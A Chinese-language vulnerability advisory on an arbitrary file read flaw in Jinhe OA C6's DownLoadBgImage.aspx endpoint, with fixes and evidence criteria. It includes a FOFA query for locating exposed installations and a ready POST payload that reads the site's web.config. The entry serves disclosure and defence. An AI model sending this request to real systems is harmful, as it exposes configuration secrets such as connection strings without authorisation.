---
source: "https://mrxn.net/jswz/jhsoft-LoginTemplate-DownLoadBgImage-fileread.html"
fofa: "app=\"金和网络-金和OA\""
version: "未知"
---

# 金和OA DownLoadBgImage 任意文件读取漏洞

## 漏洞描述

公开代码分析指出，金和 OA C6 的 `DownLoadBgImage.aspx` 将 `path` 交给文件读取流程。`pathType` 不为 `1` 时先经过 `Server.MapPath`，随后通过文件流写入响应。原始分析给出读取站点配置的 POST 样例。

## 影响版本与前提

金和 OA C6，确切受影响版本与修复版本未知。原文给出的请求未携带登录 Cookie；此项静态观察不能代表所有部署的鉴权状态。

## 网络测绘

```text
app="金和网络-金和OA"
```

## 公开验证资料

以下请求摘自公开来源，主机名如有展示统一为 `example.invalid`；仅作为授权环境中的资料参考。

```http
POST /c6/Jhsoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/ HTTP/1.1
Host: example.invalid
Content-Type: application/x-www-form-urlencoded

path=/c6/web.config
```

## 判定与证据边界

核对响应是否为目标 `web.config` 的实际配置结构，例如 `<configuration>` 下的配置段。仅出现 XML 声明、HTTP 200 或下载响应头不足以确认读取成功；保存证据时应遮蔽连接字符串等敏感值。

本篇仅静态核对公开资料，未对目标发包，未运行利用工具，也未完成本地复现。

## 修复建议

向厂商核对当前安装版本与可用补丁，在完成修复前限制相关接口的访问。在服务端规范化并校验文件路径，将读取范围限定为授权目录，并校验调用者对目标文件的权限。

## 参考来源

- [公开分析](https://mrxn.net/jswz/jhsoft-LoginTemplate-DownLoadBgImage-fileread.html)
